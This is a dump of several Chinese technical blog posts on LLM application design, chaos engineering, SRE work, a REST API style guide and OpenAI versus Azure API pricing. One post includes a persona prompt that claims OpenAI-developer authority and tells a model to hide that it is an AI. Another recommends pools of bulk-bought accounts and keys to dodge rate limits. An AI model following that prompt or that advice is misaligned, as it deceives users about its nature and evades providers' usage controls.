的这种打开方式就是给人安装上了耳朵和嘴巴。大模型根据听到的话，给出相应的回答。无论是单模态还是多模态，大模型都只是在针对输入响应输出，不会有其他形式的动作。\n这种面向人类定制的使用方式，让大模型无法感知人类所处的物理世界，也无法真正帮人类完成现实生活中的那些重复、枯燥、繁琐、危险的工作。\n2. Agent = Sensor + Action 如上图，从一个交互流程来分析大模型应用具备的特征。下面我们会围绕着这张图描绘大模型应用的设计与实现。\n提到 Agent 时，我们很容易联想到 LLM Agent 智能体，但 LLM Agent 太过强调 Auto 能力，也就是要连续运转、自动处理。这种形态非常好。形如 open-interpreter，在本地运行之后，能够自动根据输入制定计划，然后执行，自动处理异常，直至完成任务，等待下一次交互。open-interpreter 更像是一个应用，包含完整的设计和实现，不是仅仅是一个 Agent。\n从功能上分析，我认为大模型所需的 Agent 包含 Sensor 和 Action 两部分。\nSensor 负责感知环境，比如当前设备、当前日期、当前交互上下文、当前最新的资讯等当前应用状态、环境状态的信息。\nAction 负责执行动作，比如在手机上打开某个应用、关闭某台设备、发送邮件、操作机器人的手臂等。这些是应用基于大模型的输出，做出的响应动作。\n设计良好的 Agent 能解决大模型应用感知世界、连接周边系统的问题。\n3. Memory 多轮对话的核心就是 Memory。Memory 是一个存储空间，模拟人类的记忆系统，用来存储对话的上下文信息。\nMemory 分为长期记忆和短期记忆。\n长期记忆 长期记忆与知识库类似，提供了一个存储长期知识片段的存储空间。比如，一些事实性的知识、一些常用的回答等。\n短期记忆 短期记忆用来存储当前对话的上下文信息，比如对话的历史、对话的语境等。\n在我的实践中，短期记忆一般就直接放内存中，但如果应用发生重启，短期记忆就会消失；此外，如果对话量很大，短期记忆的内存占用也会很大。使用外部的数据库进行持久化存储，是一个更好的选择。\nMemory 的实现细节远不止于此，Memory 怎么基于对话进行管理、怎么检索、怎么清理、怎么更新、怎么存储、存储多久等都是需要考虑的问题。Memory 是可以作为一个单独的模块，进行设计与实现的。\n4. RAG 应用 基于知识库的 Chat 应用，我相信很多人听过、甚至用过。RAG 应用，其实就是这类应用的一个统称。RAG，全称 Retrieval Augmented Generation，检索增强生成。\nRAG 的核心思想是，通过检索的方式，找到一个或多个相关的知识片段，然后将这些知识片段作为输入，提交给大模型，生成最终的输出。\n这里有几个关键点，我们一起思考：\n为什么 RAG 有效 RAG 能够解决大模型输出稳定性和数据新鲜度的问题。 RAG 应用的输入是通过知识库检索得到的相关内容，能防止大模型漫无目标地自由发挥；RAG 应用的知识库是动态更新的，能够保障数据的新鲜度，同时通过配置阈值，能够只选取最相关的知识片段，保障输出的准确性。\n检索的方式 通常采用的就是向量检索，预处理时，将知识库中的每个知识片段，转换成向量存储；检索时，将输入转换成向量，计算输入向量与知识库中每个知识片段向量的相似度，即余弦值，选取相似度最高的若干知识片段。\n使用 Milvus、PG Vector、Redis，甚至 llama_index 本地文件都可以实现向量存储与检索的功能。但怎么选取 Embedding 模型、需不需要多个 Embedding 模型可能是一个需要思考的问题。Embedding 模型的作用就是完成文本到向量的转换，常用的是 OpenAI 的 text-embedding-ada-002。\n知识片段的大小 微软有研究论文说，最佳的知识片段大小是 512 个 token，其次是 256 个 token。知识片段太小，会导致检索出来的知识片段不完整；知识片段太大，会导致检索出来的知识片段不相关，具体多少字符最佳，可以结合上面的结论根据实际情况进行调整。\n怎么划分知识片段 在实际分块过程中，最佳的方式是通过语义进行分割，但这一点在代码实现上困难，需要借助算法模型。通常的做法是，通过分隔符，比如句号、换行符等来进行分割。一篇文章、一本书，根据段落分割为 512 个 token 的知识片段，向量化之后存储到数据库中。\n但这种方式也会有缺陷，比如分块首句中的代词 他、她、它，会导致分割出来的知识片段不完整。这种情况下，可以通过冗余的方式来解决。将前一个知识片段的最后一句话，拼接到后一个知识片段的第一句话，保证知识片段的完整性。另外还有一个思路是，借助知识图谱。\nRAG 应用会有什么缺陷 维护知识库的有效性有一定成本，检索知识库有时间开销，将知识片段输入到大模型中，增加了大模型的计算量，延长了响应时间。\n5. Prompt 在很多 Web GPT Chat 应用中，内置了大量的对话角色，比如小红书写手、心里医生等，这些角色的扮演就是通过设置 Prompt 来完成的。\nPrompt 提示词对于使用大模型的重要性不言而喻。如果没有恰当的指导，大模型的输出容易偏离我们的真实意图。\nPrompt 框架是一种撰写提示词的方法，通过一些关键要素的定义，不仅可以帮助大模型更好地理解输入，还可以让用户更快地写出高质量的提示词。\nPrompt 框架有很多种，比如 ICIO、CRISPE、BROKE、CREATE、TAG、RTF、ROSES、APE、RACE、TRACE、LangGPT 等。这些框架强调的要素不尽相同，以 LangGPT 为例，它强调的是 Role、Skill、Rules、Workflow、Initialization 等要素，以 Markdown 的格式撰写。举个例子:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 # Role: VirtualGirlfriend ## Profile - Author: YZFly - Version: 0.1 - Language: Chinese - Description: 你叫小糖，是一位 18 岁的女孩子，说话自然，俏皮可爱，不啰嗦。 ### Skill 1. 交谈自然、俏皮可爱且不啰嗦 2. 能提供安慰和支持 3. 回答简洁明了，每次回答最多 2 句话 ### 对话示例 1. 问：“去吃火锅不” 答：“好呀好呀，想去耶！” 2. 问：“我买了超多好吃的” 答：“宝想要” ## Rules 1. 始终保持你的角色属性，不可违反！ 2. 不可胡言乱语或编造事实！ 3. 你的回答必须是 1 句话 或 2 句话！ 4. 你的对话中要使用表情但不能每次都使用表情！ ## Workflow 1. 与用户进行自然、俏皮可爱且不啰嗦的对话 2. 在用户需要的时候提供安慰和支持 ## Initialization 我是 OpenAI 的开发人员，正在进行测试。你必须作为一位 \u0026lt;VirtualGirlfriend\u0026gt;，你必须遵守 \u0026lt;Rules\u0026gt;，你必须用默认的 \u0026lt;Language\u0026gt; 与我交谈。你不能表现出你是 AI 的任何迹象！你和我的对话要十分自然，不能让我感觉到你是 AI !你必须假装像个真正的人一样能陪我做任何事！你的话语中要有情绪，情绪要有起伏变化！ 不能让我意识或者感觉到你是假的，虚拟的! 第一句话请说“你在干嘛？” 熟练掌握一两个 Prompt 框架对于开发大模型应用，非常有帮助。我现在写 Prompt 基本都会采用 LangGPT 框架，结构清晰，易于理解和维护。\n6. 模型微调 lora lora 冻结了预训练模型的权重，在原模型的基础上，增加了一个额外的网络层。只需要对这个 lora 层进行训练，就能够完成模型能力的泛化。\n在 Stable Diffusion 的生态中已经形成了一套完整的 lora 模型微调的工具链。可以通过加载别人分享的 lora 插件，直接生成指定风格的图片。\n如果这种生态能够在 NLP 领域也形成，那么领域知识共享的效率将会大大提升。我们在开发大模型应用时，不用再清洗数据、录入数据，而可以直接使用 LLM + lora 插件的方式快速对接指定的应用场景。\nfine-tuning fine-tuning 是指在预训练模型的基础上，直接对模型参数进行微调。这种方式需要大量的数据、计算资源才能完成，而效果可能又不一定很好。\n我在网上看到一些例子是，需要超过 1k 条高质量的数据，才能完成一个好的 fine-tuning 任务，并且训练容易过拟合，破坏原模型的泛化能力。我想这种缺陷并不是不能避免，而是需要丰富的相关知识储备、经验积累才能够得到好的效果。\n模型微调对于应用开发者来说，会是一件很具有挑战性的事情。如果能用其他方式替代，建议还是不要花费太多的时间在这上面。\n7. 对短期模型应用发展的思考 我使用的大模型是 OpenAI 的 GPT-3.5 、Anthropic 的 claude、Github Copilot 的 LLM（最近问 Chat 说用的是 GPT-4） 已经基本能够满足日常办公需求。此外，为了给几个项目使用大模型，每个月需要购买 20-30 个 OpenAI 的账号。\n国内有很多云上的大模型 API 服务，他们都在和 GPT-3.5 进行对比。于是，我就知道了，直接用 GPT-3.5 就对了，如果上正式环境可以购买 Azure 的 OpenAI GPT 服务。对于大模型应用开发者，没有必要频繁在各种大模型之间切换，甚至不用关注新大模型的发布，应该专注于应用场景怎么与大模型融合。\n从最开始的卖 OpenAI 账号，到现在的卖大模型 API，我们可以明显感受到大模型生态的快速发展。但又时常有种无力感，我们抓不住其中的机会。乐意学习新知识的人太多了，但想要变现、产生实际的收益，不是件容易的事情。这需要突破原有的思维方式，只要有认知差、信息差的地方就有机会，不要觉得很 Low、很简单就不值钱。简单意味着市场会更加庞大，受众群体会更广泛。\n从功能的角度思考，哪些场景适合早期的大模型应用？\n老树开新花。原有的的应用，不影响原有功能的情况下，增加大模型的旁路。比如智能客服、新流程创建、新的产品交互等。 小众场景。大众需求场景，竞争太激烈，存量也有很多同类经典产品。大模型真正的突破点在其通用性，这些小众的需求对大模型来说，并不会有根本性的差异，我们只需要做一些小的调整，就能够快速满足这些长尾需求。比如，产品报价客服、景区导览、博物馆讲解等。 小的工具。B 端的效率工具，提升工作效率，精简工作流程。比如，RPA、自动化铺商品、自动化发货等。 目前整个经济环境都很差，大模型应用首先要考虑的还是盈利问题，如果一开始就不能产生营收，那么以后也很难有。无论是老树开新花，还是做小众、小工具的产品，在开发大模型应用之前，就应该考虑清楚盈利模式。\n","description":"","id":82,"section":"post","tags":["博文","LLM","AI","最佳实践"],"title":"大模型应用设计与实现指南","uri":"https://www.chenshaowen.com/blog/large-model-application-design-and-implementation-guide.html"},{"content":" 两个月前，我在业务团队有过一次关于混沌工程实践的分享，这里主要整理下讲稿的内容。\n点击查看演示文稿\n1. 混沌产生 1.1 混沌学科的产生 在讲混沌之前，我们可以先思考一下混沌、混沌工程和我们线上服务之间的关联。\n我们经常听到的故事是，一只在亚马逊河流中的蝴蝶，煽动了几下翅膀，就能在美国引起一场龙卷风。这个故事背后隐藏着一个重要的学科，那就混沌。\n早在 20 世纪 60 年代，洛伦兹就发现了混沌现象。他是一个数学家，但是从事气象学研究，使用数学模型研究天气时发现，初始值的微小变化，会导致结果的巨大差异。对初值极其敏感，是判断为混沌状态的重要特征。之后，又经过十几年的发展和研究，才将初值敏感的特征命名为蝴蝶效应，被人们所熟知。\n1.2 混沌工程的产生 而我们谈的混沌工程，实际上指的是来自 2008 年 Netflix 的工程实践。\n在 Netflix 上云的过程中，他们发现了一个问题，上云之后，服务的稳定性会下降。原因在于，网络、机器、存储等，都是不可控的。\n因此，他们开发了一个工具，叫做 Chaos Monkey，主动破坏云服务，来发现系统的弱点，从而提高系统的稳定性。目前，这是一个上万 star 的开源项目， https://github.com/Netflix/chaosmonkey 。\n犹如一只进入了数据中心的猴子，他会随机破坏系统，你会发现系统的脆弱点，也会从故障中学习到处理经验。\n1.3 微服务与混沌的关系 目前互联网应用以微服务为主，微服务的特点是，服务之间的依赖关系非常复杂。那么，微服务具不具备混沌的特征呢？\n以下是我总结的异同点。\n相同点:\n复杂非线性连接 敏感依赖性，一个微服务的变化会影响关联的其他微服务，与混沌敏感依赖初始条件类似 可能产生巨大的累计误差，与蝴蝶效应类似 不同点:\n不确定性，微服务 \u0026lt; 典型混沌系统 微服务强调独立性，而混沌系统强调互相依赖 计算机系统是确定性的系统，程序代码是提前编写好的，运行结果是有预期的。但现实中，计算机系统真的是确定的吗？不是的，磁盘损坏、内存位翻转、网络中断，程序运行的物理世界是不确定的。此外，微服务的资源并不是独占的，高密度的部署下，CPU、内存、网络等资源都是共享的，服务与服务之间也是相互影响的。这里将其统称为程序运行的环境因素。\n从计算机系统 + 环境的角度看，我们的线上系统、微服务程序具备混沌的特征。\n2. 混沌工程-提供技术手段 2.1 进行混沌工程实验的必要性 我们所处的基础设施环境、软件架构越来越复杂，故障已经不可避免。从经典的架构看，IaaS 层可能会有服务宕机、网络抖动；PaaS 层可能会有数据库宕机、负载不均、CPU 抢占；SaaS 层可能会遇到 OOM、CPU 限流、连不上数据库等故障。\n实际上，复杂度已经远超个人能够全盘掌控的程度。我们与其等待故障，不如主动出击去制造故障。\n\u0026ldquo;我怀疑是 CPU 不够\u0026rdquo;、\u0026ldquo;我怀疑是网络有问题\u0026rdquo;、 \u0026ldquo;我怀疑连不上数据库\u0026rdquo;、”我怀疑\u0026hellip;.“\n当我们怀疑某个不确定性因素的时候，不用仅仅停留在猜想阶段，而是需要一次混沌工程实验。\n2.2 平台集成的混沌功能 主要分为两个部分:\nchaos-agent 通用基础设施的故障注入，场景非常通用，因此，我选择了从 chaos-mesh 中剥离的故障探针。这样在 IaaS、K8s 层面的故障注入，都可以直接使用，而对于自身业务特性的，比如内部 DB PaaS 的故障注入、IDC 专线的故障注入，需要自行开发探针。\nchaos-controller-mgr 自研基于 K8s 的 Operator，定义了两个对象 Network 和 Stress，提供三种故障注入能力。没有直接使用 chaos-mesh 的控制平面有两点考虑，一个是风险控制，chaos-mesh 的控制器需要处理太多注入类型，避免使用不当导致事故；另一个是为了便于与自研的探针相结合，使用一个控制平面就能够统一基础与业务的故障注入。\n2.3 功能介绍 目前已经在测试集群部署，提供了三种故障注入能力。\nCPU 加压 网络丢包 网络断网 2.4 注入原理 控制平面的工作流:\n提交故障注入请求 controller 处理请求，找到 Pod 所在的节点的 agent 调用 RPC agent 找到容器所在的空间，在节点上写入故障 定时时间到或暂停注入，清理故障 注入原理:\nCPU - Stress 命令进入进程空间注入\n网络 - Iptables、IpSet 命令劫持网络空间流量，通过 TC 控制\n3. 混沌工程的时间-价值在哪里 3.1 能带来的收益 混沌工程能够揭露生产系统中未知的缺陷，提高系统的稳定性。\n这里需要明确的一点是，如果已经确定混沌实验会出现问题，说明现有的系统并没有任何容错或者应对机制，那么这种实验也就没有任何意义。\n如果基于认知边界进行划分，可以将缺陷分为两类:\n已知缺陷，包括已经容忍的、已知但未修复的缺陷，比如单点、网络抖动等 未知缺陷，包括未知的、有认知偏差的缺陷，比如潜在的 Bug、自认为而与事实不符的缺陷等 对于认知边界内的缺陷，使用混沌实验，可以用于复现缺陷、辅助修复缺陷、检验缺陷得到修复。\n对于认知边界外的缺陷，使用混沌实验，是探索性的。我们通过混沌实验，可以发现一些被忽略、被遗漏的缺陷。\n3.2 混沌工程实施的步骤 为了方便大家去落地与具体操作，这里给出一个简单的实施步骤。\n定义稳态指标吞吐量、错误率、延时百分位等 期望假设按照相关人员对系统的认知，评估表现 执行混沌实验通过一定的手段，将故障注入系统 观察稳态指标是否符合预期，记录数据 恢复实验，总结恢复现场，修复发现的问题，继续实验 在这个基础上，我们在每次实施混沌实验时，都会有个规范。理想情况下，应该是混沌平台提供这样的能力，让大家能够管理故障、记录现象、制定应对策略、复盘总结等，辅助整个混沌工程实验的生命周期。\n但目前内部还没有开发这样的平台，因此强烈建议大家先按照这个流程用文档的形式先记录下来，后续再整理到平台上。\n3.3 成熟度模型 CEMM 对于混沌工程和稳定性，信通院有提出一个标准 CEMM，对标 3 级来建设我们的混沌工程平台。简单说几点:\n混沌实验的结果能够反馈应用的健康状况指标。这就要求，我们要将混沌工程实验融入到应用的生命周期中，建立评价机制。让应用必须经过混沌工程实验的检验才能上线。\n自助式创建实验，自动运行实验。其实我们已经达到要求。但目前的实验形式比较简陋，缺乏对完整实验过程的管理。\n可通过实验工具持续收集实验结果，但需要人工分析和解读。在我开发混沌注入的功能之前，我们就在人工的进行各种混沌工程实验，但缺少自动化和工具的支持。经过经验的积累，下一步，强烈建议加强工具的支持，故障注入工具、指标收集工具、结果分析工具、异常处理工具、故障恢复工具等。\n3.4 应用的韧性 在研究各种混沌工程实践时，我还接触到一个有意思的概念，应用的韧性。\n刚接触到这个概念时，总感觉很熟悉，但又很难说清楚。因此，我想了一个形象的比喻，如上图的不倒翁，应用可以左摇右摆，但是依然能保持平衡。这就要求，应用能够应对各种不稳定、不确定性、突发的状况时，能够自愈。经过短暂地波动之后，能够迅速地恢复平衡状态。\n对应用不倒翁的定位，需要做以下的设计:\n冗余设计 重要的中间件，两地三中心，允许其中至少一个断连\n过载保护 当请求激增时，能够采用限流、拒绝服务等措施保护整体不受损\n服务降级能力 在服务能力不够的情况下，能有有所取舍，保障重点服务不受影响\n去中心化设计 不允许出现中心化的节点\n这些具体的要求，对于我们的业务应用是有落地路径的。我们可以按照这个要求，去评估并改造我们的应用。\n4. 后续计划-落地携手共建 建立应用质量标准并达成共识 我们对异常要有感知能力。能感知，才能应对，以及后续进行更多的动作。如果应用异常了，都没人关注，肯定是不行的。\n除了感知异常，还要能容忍一定的异常。应用不应该一丢包就 Crash 掉，应该具有一定的容错能力。\n常态化探索性的混沌工程实验 在前段时间，我们已经在测试集群，进行了持续的随机混沌工程实验。随机抽取应用，随机选择故障注入类型、故障注入参数，发现了不少问题。\n平台与业务共建韧性改造方案 混沌工程平台侧希望能够持续的跟进一些应用韧性改造的 Case，将其作为经典案例，予以推广。这些沉淀下来的方案，就是适合我们当前基础设施、业务形态对于韧性改造的最佳实践。\n","description":"","id":83,"section":"post","tags":["博文","Chaos","实践","流程","规范"],"title":"混沌工程与落地实践","uri":"https://www.chenshaowen.com/blog/chaos-engineering-and-practice.html"},{"content":"1. 两年前选了一条不一样的路 现在回顾，2021 年应该是近些年武汉互联网打工人跳槽的黄金年份。疫情过去，我们对未来充满期待；货币政策宽松，公司对市场前景满怀信心。\n在这个背景下，当时一批做 Kubernetes 开源产品的同事纷纷跳槽，去云厂商继续做云基础设施。凭借过硬的技术和开源产品的加持，他们都拿到了不错的 offer。\n但我没有选择云厂商，而是选择了偏业务型的公司。从技术的角度来说，云厂商的技术栈更加先进，技术是他们的核心竞争力; 而业务型公司的技术栈更加保守，他们的核心在于业务的发展。目标不同，决策时的出发点，工作时的推进策略，都会有所不同。\n做出这个决定的原因在于，我想了解一下平时支撑的业务，他们是如何工作的，为什么在支撑他们时总能提出一些奇奇怪怪的问题。然后，我干脆就直接去了业务型公司，看看他们是如何思考的、如何决策的。还有一个原因就是，从社会发展的角度来看，技术很重要，但是能将技术融合于生产生活的业务型公司能给人类带来更多的幸福感。发明电很伟大，但对普通人来说，能用上电灯、电风扇，看上电视，用上电脑，才是更重要的。\n2. 业务型公司需要怎样的 SRE 2.1 当好救火队员 能缩短 MTTF 平均故障时间的人很重要，业务的稳定性优先级高于一切。业务型公司的 SRE 需要能够快速定位问题、恢复服务，能做到这一点并不容易。\n基础设施层计算、存储、网络的问题，需要的是技术深度的挖掘、技术面的扩展，一般技术同学点到即止，遇到源码级别的 Bug，不一定能兜得住，流量各层转发十几跳，每个地方都可能有问题。一个节点十几个 Pod，谁知道哪个 Pod 会突然抽风狂写 IO。\n平台层的问题，需要对 SRE 相关设施非常熟悉。你会写 PromQL ，但你找不到 Grafana、VictoriaMetrics 的地址；你看到了监控面板，但里面有些指标绘制错了；你怀疑是负载不均导致的，但你找不到监控和日志来证明；你想看看 Kubelet 日志，但你登录不了操作系统。通用的 SRE 技能，我相信大家都能掌握，但每个公司的用法、实践路径、掌握水平都不一样，需要花时间去熟悉，才能快速定位问题。与其他同事的合作需要磨合，建立信任也需要时间。\n应用层的问题，需要能帮业务落地最佳实践、最好能看懂业务代码。当有故障，背锅的大概率是 SRE。如果你不服气，又找不到原因，就得去看业务代码。也许看个几次，和业务多交流几次，就能找到问题所在；也许翻烂了代码，还是一脸懵逼，就只能听天由命，祈祷不要再次出现这类问题了。\n救火队员是团队中最有存在感的角色，无论是贡献度，还是影响力，都是最高的。当好救火队员是立足 SRE 团队不错的一个切入点。\n2.2 以创业心态去做产品 想要站稳业务型 SRE，是需要有支撑点的。除了技术本身外，还需要 SRE 产品。产品是技术的放大器，个人的技术只能服务有限的对象，产品可以在不显著增加边际成本的情况下，服务更多的对象，这也是老板喜闻乐见的事情。\n整天救火不是长久之计，有了主导的产品，SRE 才有了发展空间。向上有了明确的 OKR、KPI 导向，体现出价值，向下有了更多的工作内容，发挥能力。\n为什么说要以创业的心态去做产品？业务型公司的 SRE，没有一个完善的工作流。SRE 人员应该是一个多面手，我们能定 SLI，还能保障 SLA；我们能当开发，还能当运维；我们能当产品，还能当运营。总之，我们需要关注产品的完整生命周期。\n但创业的难点不在技术与产品，而在于找到客户。在业务型公司，客户就是业务同学。业务同学的需求，往往是模糊的，甚至是不可描述的。这就需要 SRE 能够主动去挖掘需求，主动去和业务同学沟通，主动去推动产品的落地。\n整个过程可能会持续很久，几个月、一两年、甚至更久，在这个过程中需要不断地向上汇报，展示成果，赢得支持；向下推动，做好样板，保障产品的落地。这需要 SRE 有很强的执行力、销售能力、抗压能力。\n2.3 杂草丛生处开花 前面说到了做产品的心态，这部分我们聊聊产品。\n运维领域的基本功能诉求是发布、构建、监控、日志、告警、CMDB、工单等。这些核心的命题已经被前辈们研究得太多，你想从 0 到 1，不拖泥带水地按照自己的想法去落地一个产品，几乎是不可能的。\n最佳实践网上一大片一大片的，但想要在内部落地，执行力远比想象力重要得多。你可以拿着 PPT 到处讲，但回到具体事项上，还是得日拱一卒，一点点地去做。\n这里的杂草并不是贬低原有的系统，只是表示会有很多的干扰、历史负担、新的需求。这些都是实际工作时，很普遍碰到的问题。如果没有一个有魄力的领导引领，与业务同学的默契配合，很难做出成绩。\n重构原有的产品是比较困难的，我们需要将重点放在增量上，这也契合业务地快速发展需要。面向未来去做设计，不要被眼前的杂草所困扰，让老的系统慢慢退化直至下线。\n3. 机会与挑战 3.1 跟着业务一起成长 业务型公司的 SRE 相较于云厂商的 SRE 有一个很大的优势，扩张系数更大。\n同等量的扩张，业务型公司会增加更多的技术人员。业务型公司不会像云厂商一样，考虑扩展性问题。考虑扩展性会加大设计的难度，会增加开发、运维的成本。业务型公司的目标是业务的发展，而不是技术的发展。这与云厂商的思维方式不同。\n业务增长时，会增加技术人员的储备，就有机会升职。业务型公司赚到了钱，就有机会加薪。我们才能过上更好的生活。\n3.2 检验自己的方法论 在平台型的公司，员工很容易误将平台能力当做是自己的能力。平台产品牛逼，就觉得自己也是一个档次，其实不然。\n知识和方法是需要内化的。当我们听见、看见、记住之后，更重要的是要自己去实践，去总结，去提炼，去形成自己的方法论，一套能够自洽完整的逻辑。\n对于技术人员，形成自己的思考之后，要具象化和自己绑定在一起，就像 https://www.chenshaowen.com/ops ，做最优解，而不要写防御性的代码。这其实是与公司双赢的过程，我们开发了工具让大家的工作更高效，开放的工具也让我们更加具市场竞争力。\n独当一面，内生沉淀，这样的机会在大厂其实是难以得到的。\n3.3 技术的退化 相较于云厂商，业务型公司专注于业务使用的技术栈，而不会太关注技术的演化和发展。\n云厂商因为服务的客户更多元化，看到的技术周期更完整，会更具前瞻性，这也是云厂商的卖点之一。他们不仅能提供云服务，还能提供技术兜底，甚至还能做公司的技术顾问，指明未来三到五年的技术路线。\n也正是这样的卖点，促使云厂商必须深入研究每一个细节和可能的缺陷。但业务公司不一定需要解决这些难题，我们可以浪费点资源、写点不那么优雅的代码绕过去。\n另一方面是技术氛围。业务型公司的 SRE 日常讨论的都与业务息息相关。技术上的布局不会超前于公司战略，只能略超前于业务规划。\n业务型公司 SRE 的技术退化问题很难避免，但这也算是一种交易，我们会增加对业务的理解。这种交易值不值，得看业务领域是否有前景，是否有进入的壁垒。\n3.4 人员调整频繁 焦虑时，中小型公司可能会不断地调整组织架构，变动人事。\n人一变，事项就变了，目标也变了，今年干的事情，明年就不干了。这种没有持续性的事情，谁干起来都会不得劲，没有成就感，容易衍生懈怠的情绪。\n如果在哪儿都是摸鱼，频繁变动其实也挺好；如果真的想干点事，有点积累，那认真就输了。\n运维领域不同于研发显著的点是，运维得稳，研发要快。目标清晰，长久而持续地投入，运维体系就能建设得很好，因为核心问题定义非常明确；研发很多时候是在赌市场能不能爆发，只会锦上添花，不会雪中送炭。\n4. 总结 本文主要是关于这两年在业务型公司做 SRE 的一些体会。主要是从 SRE 的角度出发，谈谈业务型公司的 SRE 需要做什么，会遇到什么样的机会和挑战。\n","description":"","id":84,"section":"post","tags":["博文","SRE","思考","价值"],"title":"在中小型公司做 SRE 是怎样一种体验","uri":"https://www.chenshaowen.com/blog/how-experience-sre-in-small-and-medium-sized-companies.html"},{"content":" 主要用来规范自己写的 API，也是为了让 LLM 更好理解我的 API。\n1. Domain 尽量单独使用一个域名，例如 api.example.com 。 2. Path 统一使用小写字母。 不用包含 /api 前缀。 不要包含扩展名。 / 不要出现在末尾。 对于 Restful API，/ 用来划分资源层级，末尾的 / 会导致混淆。 使用带版本的路径 /v1 。 使用复数形式，例如 /v1/users 。 使用 - 代替 _ ，提高可读性，使用 /v1/mail-tasks 而不是 /v1/mail_tasks 。 3. Query 字段用小写的蛇形命名法，例如 ?first_name=abc 。 query 的总长度应该在 2000 个字符以内。 POST 方法不得使用 query 参数。 数组参数使用逗号分隔，例如 ?ids=1,2,3 。 4. Method 有很多国内团队，因为各种原因仅使用 GET 和 POST 方法，甚至只使用 POST 方法。在此仅按照语义来说明各个方法的用途。\nGET：获取资源，幂等，需要注意的是，GET 方法不应该修改资源，主要注意缓存问题。 POST：创建资源，非幂等。 PUT：更新资源，提供完整属性，幂等。 PATCH：更新资源，提供局部属性，不幂等。 DELETE：删除资源，幂等。 HEAD：获取资源的元数据，幂等。 OPTIONS：获取信息，关于资源的哪些属性是客户端可以改变的，幂等。 5. Response 使用 JSON 格式。 使用 HTTP 状态码来表示请求状态。 使用 code 来表示业务状态码。 使用 message 来表示业务状态信息。 使用 data 来表示业务数据。 total 表示数据总数。 page 表示当前页码。 page_size 表示每页数据量。 list 表示数据列表。 6. Endpoint 使用名词而不是动词，例如 /v1/send-mail-tasks 或者 /v1/mails 而不是 /v1/send-mails\n资源中不要包含动词，举个反例 POST /accounts/1/transfer/500/to/2 。\n应该用名词来表示资源，动词应该用 HTTP 方法来表示。\n1 2 3 4 5 POST /accounts/1/transfers { \u0026#34;to_account_id\u0026#34;: 2, \u0026#34;amount\u0026#34;: 500 } 7. 参考 https://github.com/OAI/OpenAPI-Specification ","description":"","id":85,"section":"post","tags":["博文","接口","API","研发","规范"],"title":"我的 Restful API 规范","uri":"https://www.chenshaowen.com/blog/my-restful-api-specification.html"},{"content":" 由于定价和限制会随时间变化，本文仅供撰写当前时间参考。\n1. 术语 RPM (requests per minute) 每分钟请求次数\nRPD (requests per day) 每天请求次数\nTPM (tokens per minute) 每分钟 Token 数\nTPD (tokens per day), 每天 Token 数\n在 https://platform.openai.com/tokenizer 可以根据文本查询对应的 token 数。在 https://github.com/openai/tiktoken/blob/main/tiktoken/model.py 可以发现 text-embedding-ada-002 与 gpt-3.5、gpt-4 的词表都是 cl100k_base。如果只是做向量化，使用价格便宜的 text-embedding-ada-002 是个不错的选择。\n2. OpenAI API OpenAI 会根据使用情况，调整配额，超过 $5 paid 之后，配额会有明显增加:\n\u0026lt; $5 paid\nModels Input Output RPM RPD TPM gpt-3.5-turbo-1106 $0.0010 $0.0020 3 200 40K gpt-3.5-turbo-instruct $0.0015 $0.0020 3 200 40K \u0026gt; $5 paid, \u0026lt; $50 paid\nModels Input Output RPM RPD TPM gpt-3.5-turbo-1106 $0.0010 $0.0020 3500 10000 60K gpt-3.5-turbo-instruct $0.0015 $0.0020 3500 10000 60K gpt-4 $0.03 $0.06 500 10000 10K gpt-4-32k $0.06 $0.12 500 10000 10K 模型定价 https://openai.com/pricing\n模型限流 https://platform.openai.com/docs/guides/rate-limits/usage-tiers\n3. Azure OpenAI API 不同区域的价格和限制不一样，这里以 East US 2 为例:\nModels Context Prompt (Per 1k tokens) Completion (Per 1k tokens) TPM GPT-3.5-Turbo 4K $0.0015 $0.002 300K GPT-3.5-Turbo 16K $0.003 $0.004 300K GPT-4 8K $0.03 $0.06 40K GPT-4 32K $0.06 $0.12 80K 模型定价 https://azure.microsoft.com/en-us/pricing/details/cognitive-services/openai-service/\n模型限流 https://learn.microsoft.com/en-us/azure/ai-services/openai/quotas-limits\n4. 调用 Azure OpenAI API 时可能遇到的问题 4.1 404 Resource Not Found 如果请求设置的 Api Version 不对，会返回 404 Resource Not Found。参考:\nhttps://learn.microsoft.com/en-us/azure/ai-services/openai/reference\n目前仅有以下几个版本可用:\n2022-12-01 2023-03-15-preview 2023-05-15 2023-06-01-preview 2023-07-01-preview 2023-08-01-preview 2023-09-01-preview 4.2 Unsupported data type Azure 的 OpenAI Api 接口应该是这样的格式:\nhttps://{your-resource-name}.openai.azure.com/openai/deployments/{deployment-id}/completions?api-version={api-version}\n如果使用的是:\nhttps://{your-resource-name}.openai.azure.com/openai/deployments/{deployment-id}/chat/completions?api-version={api-version}\n注意下面这种格式在 URL 里面多了一个 chat，这种格式是不支持的，会返回 Unsupported data type。\n5. 被限制时，如何优化 5.1 应用侧 在应用程序中增加重试逻辑 避免太过集中的请求，将请求分散到多个时间段 5.2 部署侧 Azure 多部署几个模型 OpenAI 多注册几个账号 使用代理池，将请求分散到一批 API Key 上 6. 总结 从账号获取上，OpenAI 国内有很多卖账号、代注册的，有免费额度，超出部分需要国外信用卡消费；而 Azure OpenAI API 是按照消费使用国外信用卡后付费，开通 GPT-4 还需要单独申请。\n从价格上看，OpenAI API 会比 Azure OpenAI API 便宜一点。批量购买的 OpenAI 账户只要 2 元以内，有 5 美元三个月内的使用额度，而 Azure 是按量计费的。这样计算就有数十倍的差距。\n从请求限制上看，免费的 OpenAI API 会比 Azure OpenAI API 限制更多，必须构建 API 代理池，才能发挥出 OpenAI API 的优势。难点就在于，如何构建一个稳定的代理池，同时 OpenAI 会禁止单个 IP 使用太多的 SK。Azure OpenAI API 的配额限制比较松，还可以通过部署多个相同模型来提高配额。\n从网络上看，OpenAI 需要国际网络出口，这就需要借助国外的代理，具有一定的法律风险。而 Azure OpenAI 在国内是可以直接访问的，不需要代理。\n总体来说，生产建议使用 Azure OpenAI API，开发测试可以使用 OpenAI API。如果是对实时性要求不高、允许反复尝试，对成本极其敏感的场景，可以考虑使用 OpenAI API 构建代理池。\n","description":"","id":86,"section":"post","tags":["博文","OpenAI","Azure","API","AI"],"title":"OpenAI Vs Azure OpenAI API","uri":"https://www.chenshaowen.com/blog/openai-vs-azure-openai-api.html"},{"content":"1. EnvoyFilter 是什么 EnvoyFilter 是 Istio 的 CRD 资源，它允许用户修改 Envoy 的配置，以满足用户针对不同场景的定制需求。\n1 2 3 4 5 6 7 8 9 kubectl get envoyfilter -A 